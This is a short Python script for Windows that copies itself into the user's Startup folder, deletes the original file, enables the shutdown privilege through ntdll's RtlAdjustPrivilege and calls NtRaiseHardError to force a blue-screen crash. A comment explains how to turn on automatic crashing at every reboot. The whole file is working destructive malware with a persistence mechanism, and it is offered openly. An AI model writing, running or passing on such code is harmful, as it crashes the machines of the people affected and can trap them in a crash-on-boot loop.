import ctypes
import sys
import os
import shutil

def startup():
    """
    Loads in ntdll.dll using ctypes, 
    Gets the name and path of the script or executable
    Sets the path for users start up
    Changes executables name
    """
    args = os.path.abspath(sys.argv[0])
    startup = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    executable = "BSOD.exe.malz" # Remove .malz for auto trigger on reboot
    file_src = os.path.join(args)
    file_dst = os.path.join(startup, executable)

    try:
        ntdll = ctypes.windll.ntdll
    except Exception as e:
        print(f"[@] Failed to load ntdll.dll: {e}")
        
    if os.path.exists(file_src):
        shutil.copy(file_src, file_dst)
        os.remove(args) # will remove the orginal file once copied to start up 
        print(f"[@] Program copied to {file_dst} and then removed")
    else:
        print("[@] Program not found")
    
    return ntdll

def adjust_privilege(privilege_value, ntdll):
    c_bool = ctypes.c_bool  
    try:
        result = ntdll.RtlAdjustPrivilege(
            ctypes.c_ulong(privilege_value), # int Privilege
            c_bool(True),                    # bool bEnablePrivilege
            c_bool(False),                   # bool IsThreadPrivilege
            ctypes.byref(c_bool())           # out bool PreviousValue
        )                                    # RtlAdjustPrivilege(19, true, false, out bool previousValue);
        return result == 0

    except Exception as e:
        print(f"[@] Error adjusting privilege: {e}")
        return result == 1
    
ntdll = startup()
BSOD = 3221226005
if adjust_privilege(19, ntdll):
    """
    19 is SE_SHUTDOWN_PRIVILEGE - declared in wdm.h.
    BSOD error code (3221226005 corresponds to 0xC0000135)
    """

    try:
        ntdll.NtRaiseHardError(BSOD, 0, 0, 0, 6, ctypes.byref(ctypes.c_char_p(0)))    
    except Exception as e:
        print(f"[@] Error raising BSOD error: {e}")


